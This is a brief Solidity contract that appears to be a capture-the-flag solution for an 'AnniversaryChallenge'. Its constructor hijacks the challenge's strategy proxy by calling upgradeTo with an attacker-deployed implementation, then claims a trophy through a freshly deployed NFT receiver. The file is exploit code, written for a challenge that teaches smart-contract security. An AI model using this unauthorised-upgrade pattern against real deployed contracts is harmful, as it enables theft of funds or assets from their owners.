// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {AnniversaryChallenge} from "../../AnniversaryChallenge.sol";
import {Solution2Strategy} from "./Solution2Strategy.sol";
import {NftReceiver} from "./NftReceiver.sol";

contract Solution2 {
    constructor(address _challenge) payable {   
        AnniversaryChallenge challenge = AnniversaryChallenge(_challenge);      

        Solution2Strategy newStrategy = new Solution2Strategy();
        NftReceiver nftReceiver = new NftReceiver{ value: 1 wei }(msg.sender); 

        challenge.simpleStrategy().upgradeTo(address(newStrategy));
        challenge.claimTrophy{ gas: 500000 }(address(nftReceiver), 1e6);
    }
}